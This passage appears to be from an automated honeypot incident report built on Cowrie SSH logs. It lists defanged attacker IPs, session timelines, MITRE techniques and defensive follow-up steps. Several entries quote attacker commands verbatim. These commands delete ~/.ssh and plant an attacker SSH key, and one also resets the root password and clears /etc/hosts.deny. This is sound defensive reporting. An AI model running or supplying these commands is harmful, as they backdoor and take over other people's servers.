| `2026-06-07 12:59:41` | `cowrie.session.params` |
| `2026-06-07 12:59:41` | `cowrie.command.input` |
| `2026-06-07 12:59:41` | `cowrie.command.failed` |
| `2026-06-07 12:59:41` | `cowrie.log.closed` |
| `2026-06-07 12:59:41` | `cowrie.session.params` |
| `2026-06-07 12:59:41` | `cowrie.command.input` |
| `2026-06-07 12:59:41` | `cowrie.session.file_download` |
| `2026-06-07 12:59:41` | `cowrie.log.closed` |
| `2026-06-07 12:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877c041dc8ab

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:59 |
| **Last Seen** | 2026-06-07 12:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:59:42` | `cowrie.session.connect` |
| `2026-06-07 12:59:42` | `cowrie.client.version` |
| `2026-06-07 12:59:42` | `cowrie.client.kex` |
| `2026-06-07 12:59:43` | `cowrie.login.success` |
| `2026-06-07 12:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4e81db7af3

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-06-07 13:05 |
| **Last Seen** | 2026-06-07 13:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:05:01` | `cowrie.session.connect` |
| `2026-06-07 13:05:01` | `cowrie.client.version` |
| `2026-06-07 13:05:01` | `cowrie.client.kex` |
| `2026-06-07 13:05:02` | `cowrie.login.success` |
| `2026-06-07 13:05:02` | `cowrie.session.params` |
| `2026-06-07 13:05:02` | `cowrie.command.input` |
| `2026-06-07 13:05:02` | `cowrie.command.failed` |
| `2026-06-07 13:05:02` | `cowrie.log.closed` |
| `2026-06-07 13:05:02` | `cowrie.session.params` |
| `2026-06-07 13:05:02` | `cowrie.command.input` |
| `2026-06-07 13:05:02` | `cowrie.session.file_download` |
| `2026-06-07 13:05:02` | `cowrie.log.closed` |
| `2026-06-07 13:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cde800fcc10

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-06-07 13:05 |
| **Last Seen** | 2026-06-07 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:05:04` | `cowrie.session.connect` |
| `2026-06-07 13:05:04` | `cowrie.client.version` |
| `2026-06-07 13:05:04` | `cowrie.client.kex` |
| `2026-06-07 13:05:05` | `cowrie.login.success` |
| `2026-06-07 13:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa46cf1114d8

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 13:06 |
| **Last Seen** | 2026-06-07 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:06:10` | `cowrie.session.connect` |
| `2026-06-07 13:06:10` | `cowrie.client.version` |
| `2026-06-07 13:06:10` | `cowrie.client.kex` |
| `2026-06-07 13:06:10` | `cowrie.login.success` |
| `2026-06-07 13:06:10` | `cowrie.session.params` |
| `2026-06-07 13:06:10` | `cowrie.command.input` |
| `2026-06-07 13:06:10` | `cowrie.command.failed` |
| `2026-06-07 13:06:10` | `cowrie.log.closed` |
| `2026-06-07 13:06:10` | `cowrie.session.params` |
| `2026-06-07 13:06:10` | `cowrie.command.input` |
| `2026-06-07 13:06:10` | `cowrie.session.file_download` |
| `2026-06-07 13:06:10` | `cowrie.log.closed` |
| `2026-06-07 13:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea2b484bc3d2

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 13:06 |
| **Last Seen** | 2026-06-07 13:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:06:11` | `cowrie.session.connect` |
| `2026-06-07 13:06:11` | `cowrie.client.version` |
| `2026-06-07 13:06:11` | `cowrie.client.kex` |
| `2026-06-07 13:06:12` | `cowrie.login.success` |
| `2026-06-07 13:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e5b76a09f0d

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-07 13:08 |
| **Last Seen** | 2026-06-07 13:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:08:08` | `cowrie.session.connect` |
| `2026-06-07 13:08:08` | `cowrie.client.version` |
| `2026-06-07 13:08:09` | `cowrie.client.kex` |
| `2026-06-07 13:08:09` | `cowrie.login.success` |
| `2026-06-07 13:08:10` | `cowrie.session.params` |
| `2026-06-07 13:08:10` | `cowrie.command.input` |
| `2026-06-07 13:08:10` | `cowrie.command.failed` |
| `2026-06-07 13:08:10` | `cowrie.log.closed` |
| `2026-06-07 13:08:10` | `cowrie.session.params` |
| `2026-06-07 13:08:10` | `cowrie.command.input` |
| `2026-06-07 13:08:10` | `cowrie.session.file_download` |
| `2026-06-07 13:08:10` | `cowrie.log.closed` |
| `2026-06-07 13:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66c1d6376f7

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-07 13:08 |
| **Last Seen** | 2026-06-07 13:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:08:13` | `cowrie.session.connect` |
| `2026-06-07 13:08:13` | `cowrie.client.version` |
| `2026-06-07 13:08:14` | `cowrie.client.kex` |
| `2026-06-07 13:08:14` | `cowrie.login.success` |
| `2026-06-07 13:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98e64a91e0e9

| Field | Detail |
|---|---|
| **Source IP** | `103.214.112[.]253` |
| **First Seen** | 2026-06-07 13:09 |
| **Last Seen** | 2026-06-07 13:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:09:18` | `cowrie.session.connect` |
| `2026-06-07 13:09:18` | `cowrie.client.version` |
| `2026-06-07 13:09:18` | `cowrie.client.kex` |
| `2026-06-07 13:09:18` | `cowrie.login.success` |
| `2026-06-07 13:09:18` | `cowrie.session.params` |
| `2026-06-07 13:09:18` | `cowrie.command.input` |
| `2026-06-07 13:09:18` | `cowrie.command.failed` |
| `2026-06-07 13:09:18` | `cowrie.log.closed` |
| `2026-06-07 13:09:19` | `cowrie.session.params` |
| `2026-06-07 13:09:19` | `cowrie.command.input` |
| `2026-06-07 13:09:19` | `cowrie.session.file_download` |
| `2026-06-07 13:09:19` | `cowrie.log.closed` |
| `2026-06-07 13:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.214.112[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.214.112[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c2f06327d2d

| Field | Detail |
|---|---|
| **Source IP** | `103.214.112[.]253` |
| **First Seen** | 2026-06-07 13:09 |
| **Last Seen** | 2026-06-07 13:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:09:20` | `cowrie.session.connect` |
| `2026-06-07 13:09:20` | `cowrie.client.version` |
| `2026-06-07 13:09:20` | `cowrie.client.kex` |
| `2026-06-07 13:09:21` | `cowrie.login.success` |
| `2026-06-07 13:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.214.112[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.214.112[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66dea49423e6

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-07 13:10 |
| **Last Seen** | 2026-06-07 13:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:10:34` | `cowrie.session.connect` |
| `2026-06-07 13:10:34` | `cowrie.client.version` |
| `2026-06-07 13:10:34` | `cowrie.client.kex` |
| `2026-06-07 13:10:34` | `cowrie.login.success` |
| `2026-06-07 13:10:35` | `cowrie.session.params` |
| `2026-06-07 13:10:35` | `cowrie.command.input` |
| `2026-06-07 13:10:35` | `cowrie.command.failed` |
| `2026-06-07 13:10:35` | `cowrie.log.closed` |
| `2026-06-07 13:10:35` | `cowrie.session.params` |
| `2026-06-07 13:10:35` | `cowrie.command.input` |
| `2026-06-07 13:10:36` | `cowrie.session.file_download` |
| `2026-06-07 13:10:36` | `cowrie.log.closed` |
| `2026-06-07 13:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3fb93843aee

| Field | Detail |
|---|---|
| **Source IP** | `138.124.99[.]219` |
| **First Seen** | 2026-06-07 13:10 |
| **Last Seen** | 2026-06-07 13:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:10:38` | `cowrie.session.connect` |
| `2026-06-07 13:10:38` | `cowrie.client.version` |
| `2026-06-07 13:10:38` | `cowrie.client.kex` |
| `2026-06-07 13:10:39` | `cowrie.login.success` |
| `2026-06-07 13:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.99[.]219` to AbuseIPDB if not already reported
- [ ] Block `138.124.99[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5890f4b11230

| Field | Detail |
|---|---|
| **Source IP** | `46.6.124[.]216` |
| **First Seen** | 2026-06-07 13:31 |
| **Last Seen** | 2026-06-07 13:31 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:lTXiCRkv60yj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:31:10` | `cowrie.session.connect` |
| `2026-06-07 13:31:10` | `cowrie.client.version` |
| `2026-06-07 13:31:10` | `cowrie.client.kex` |
| `2026-06-07 13:31:11` | `cowrie.login.success` |
| `2026-06-07 13:31:11` | `cowrie.session.params` |
| `2026-06-07 13:31:11` | `cowrie.command.input` |
| `2026-06-07 13:31:11` | `cowrie.command.failed` |
| `2026-06-07 13:31:12` | `cowrie.log.closed` |
| `2026-06-07 13:31:12` | `cowrie.session.params` |
| `2026-06-07 13:31:12` | `cowrie.command.input` |
| `2026-06-07 13:31:12` | `cowrie.session.file_download` |
| `2026-06-07 13:31:12` | `cowrie.log.closed` |
| `2026-06-07 13:31:12` | `cowrie.session.params` |
| `2026-06-07 13:31:12` | `cowrie.command.input` |
| `2026-06-07 13:31:13` | `cowrie.log.closed` |
| `2026-06-07 13:31:13` | `cowrie.session.params` |
| `2026-06-07 13:31:13` | `cowrie.command.input` |
| `2026-06-07 13:31:13` | `cowrie.log.closed` |
| `2026-06-07 13:31:14` | `cowrie.session.params` |
| `2026-06-07 13:31:14` | `cowrie.command.input` |
| `2026-06-07 13:31:14` | `cowrie.session.file_download` |
| `2026-06-07 13:31:14` | `cowrie.log.closed` |
| `2026-06-07 13:31:14` | `cowrie.session.params` |
| `2026-06-07 13:31:14` | `cowrie.command.input` |
| `2026-06-07 13:31:14` | `cowrie.log.closed` |
| `2026-06-07 13:31:15` | `cowrie.session.params` |
| `2026-06-07 13:31:15` | `cowrie.command.input` |
| `2026-06-07 13:31:15` | `cowrie.log.closed` |
| `2026-06-07 13:31:15` | `cowrie.session.params` |
| `2026-06-07 13:31:15` | `cowrie.command.input` |
| `2026-06-07 13:31:15` | `cowrie.command.input` |
| `2026-06-07 13:31:16` | `cowrie.log.closed` |
| `2026-06-07 13:31:16` | `cowrie.session.params` |
| `2026-06-07 13:31:16` | `cowrie.command.input` |
| `2026-06-07 13:31:16` | `cowrie.log.closed` |
| `2026-06-07 13:31:16` | `cowrie.session.params` |
| `2026-06-07 13:31:16` | `cowrie.command.input` |
| `2026-06-07 13:31:17` | `cowrie.log.closed` |
| `2026-06-07 13:31:17` | `cowrie.session.params` |
| `2026-06-07 13:31:17` | `cowrie.command.input` |
| `2026-06-07 13:31:17` | `cowrie.log.closed` |
| `2026-06-07 13:31:17` | `cowrie.session.params` |
| `2026-06-07 13:31:17` | `cowrie.command.input` |
| `2026-06-07 13:31:18` | `cowrie.log.closed` |
| `2026-06-07 13:31:18` | `cowrie.session.params` |
| `2026-06-07 13:31:18` | `cowrie.command.input` |
| `2026-06-07 13:31:18` | `cowrie.log.closed` |
| `2026-06-07 13:31:19` | `cowrie.session.params` |
| `2026-06-07 13:31:19` | `cowrie.command.input` |
| `2026-06-07 13:31:19` | `cowrie.log.closed` |
| `2026-06-07 13:31:19` | `cowrie.session.params` |
| `2026-06-07 13:31:19` | `cowrie.command.input` |
| `2026-06-07 13:31:19` | `cowrie.log.closed` |
| `2026-06-07 13:31:20` | `cowrie.session.params` |
| `2026-06-07 13:31:20` | `cowrie.command.input` |
| `2026-06-07 13:31:20` | `cowrie.log.closed` |
| `2026-06-07 13:31:20` | `cowrie.session.params` |
| `2026-06-07 13:31:20` | `cowrie.command.input` |
| `2026-06-07 13:31:21` | `cowrie.log.closed` |
| `2026-06-07 13:31:21` | `cowrie.session.params` |
| `2026-06-07 13:31:21` | `cowrie.command.input` |
| `2026-06-07 13:31:21` | `cowrie.log.closed` |
| `2026-06-07 13:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.6.124[.]216` to AbuseIPDB if not already reported
- [ ] Block `46.6.124[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80ad01f0fbf

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:34 |
| **Last Seen** | 2026-06-07 13:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:34:17` | `cowrie.session.connect` |
| `2026-06-07 13:34:17` | `cowrie.client.version` |
| `2026-06-07 13:34:17` | `cowrie.client.kex` |
| `2026-06-07 13:34:18` | `cowrie.login.success` |
| `2026-06-07 13:34:18` | `cowrie.session.params` |
| `2026-06-07 13:34:18` | `cowrie.command.input` |
| `2026-06-07 13:34:18` | `cowrie.command.failed` |
| `2026-06-07 13:34:18` | `cowrie.log.closed` |
| `2026-06-07 13:34:19` | `cowrie.session.params` |
| `2026-06-07 13:34:19` | `cowrie.command.input` |
| `2026-06-07 13:34:19` | `cowrie.session.file_download` |
| `2026-06-07 13:34:19` | `cowrie.log.closed` |
| `2026-06-07 13:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349a9fd9d184

| Field | Detail |
|---|---|
| **Source IP** | `103.167.89[.]222` |
| **First Seen** | 2026-06-07 13:34 |
| **Last Seen** | 2026-06-07 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 13:34:20` | `cowrie.session.connect` |
| `2026-06-07 13:34:20` | `cowrie.client.version` |
| `2026-06-07 13:34:21` | `cowrie.client.kex` |
| `2026-06-07 13:34:21` | `cowrie.login.success` |
| `2026-06-07 13:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.167.89[.]222` to AbuseIPDB if not already reported
- [ ] Block `103.167.89[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0cbbd0a99f

| Field | Detail |
|---|---|
| **Source IP** | `20.244.18[.]126` |
| **First Seen** | 2026-06-07 13:38 |
| **Last Seen** | 2026-06-07 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
